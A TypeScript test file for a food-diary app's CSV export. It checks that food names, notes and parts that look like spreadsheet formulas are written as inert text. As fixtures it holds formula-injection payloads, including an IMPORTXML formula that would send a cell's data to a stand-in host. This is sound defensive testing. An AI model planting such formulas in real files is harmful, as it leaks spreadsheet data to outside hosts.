// Security review (P10-09): a CSV export never hands a spreadsheet a formula. Food names come from
// AI replies and from Open Food Facts, which anyone can edit, so a name such as
// `=HYPERLINK(...)` must open as text.
import { describe, expect, it } from 'vitest';
import { makeEntry, makeLine } from '../../test/factories';
import { buildDocument, toJson } from './exportDiary';
import { CSV_COLUMNS, inertText, toCsv } from './exportFormats';

const DAY = '2026-10-26';
const at = (time: string) => Date.parse(`${DAY}T${time}:00-04:00`);

/** RFC 4180 text back into rows of cells. */
function readCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = '';
  let quoted = false;
  for (let i = 0; i < text.length; i++) {
    const char = text[i]!;
    if (quoted) {
      if (char === '"' && text[i + 1] === '"') {
        cell += '"';
        i++;
      } else if (char === '"') quoted = false;
      else cell += char;
    } else if (char === '"') quoted = true;
    else if (char === ',') {
      row.push(cell);
      cell = '';
    } else if (char === '\r' && text[i + 1] === '\n') {
      rows.push([...row, cell]);
      row = [];
      cell = '';
      i++;
    } else cell += char;
  }
  return rows;
}

const column = (name: string) => CSV_COLUMNS.indexOf(name);

describe('inertText', () => {
  it.each([
    ['=HYPERLINK("https://example.test")', `'=HYPERLINK("https://example.test")`],
    ['+cmd', "'+cmd"],
    ['-2 eggs', "'-2 eggs"],
    ['@SUM(A1)', "'@SUM(A1)"],
    ['\tTabbed', "'\tTabbed"],
    ['\rReturn', "'\rReturn"],
  ])('turns %j into text a spreadsheet will not evaluate', (value, inert) => {
    expect(inertText(value)).toBe(inert);
  });

  it.each(['Oats', 'Soup = lunch', "Mac 'n' cheese", '', '2 eggs'])(
    'leaves %j as it is',
    (value) => {
      expect(inertText(value)).toBe(value);
    },
  );
});

describe('toCsv: no formula reaches a spreadsheet (P10-09)', () => {
  it('writes a formula-looking name, note and part as text, and leaves numbers and plain names alone', () => {
    const document = buildDocument({
      range: { start: DAY, end: DAY },
      entries: [
        makeEntry({
          name: '=IMPORTXML(CONCAT("https://example.test/?",A2);"//a")',
          note: '+1 for the sauce',
          kcal: 410,
          lines: [makeLine({ name: '@SUM(B1:B9)', grams: 150, kcal: 168 })],
          loggedAt: at('12:00'),
        }),
        makeEntry({ name: 'Oats', kcal: 320, lines: [], loggedAt: at('08:05') }),
      ],
      water: [],
      targets: null,
    });

    const rows = readCsv(toCsv(document)).slice(1);
    const guarded = rows.find((row) => row[column('name')]?.includes('IMPORTXML'));
    const oats = rows.find((row) => row[column('name')] === 'Oats');

    expect(guarded?.[column('name')]).toBe(
      `'=IMPORTXML(CONCAT("https://example.test/?",A2);"//a")`,
    );
    expect(guarded?.[column('note')]).toBe("'+1 for the sauce");
    expect(guarded?.[column('parts')]).toBe("'@SUM(B1:B9) (150 g, 168 kcal)");
    expect(guarded?.[column('energy_kcal')]).toBe('410');
    expect(oats?.[column('energy_kcal')]).toBe('320');
    for (const row of rows) {
      expect(row).toHaveLength(CSV_COLUMNS.length);
      for (const cell of row) expect(cell).not.toMatch(/^[=+\-@\t\r]/);
    }

    // The JSON file keeps the name exactly: only the spreadsheet format is guarded.
    expect(toJson(document)).toContain('"name": "=IMPORTXML(');
  });
});
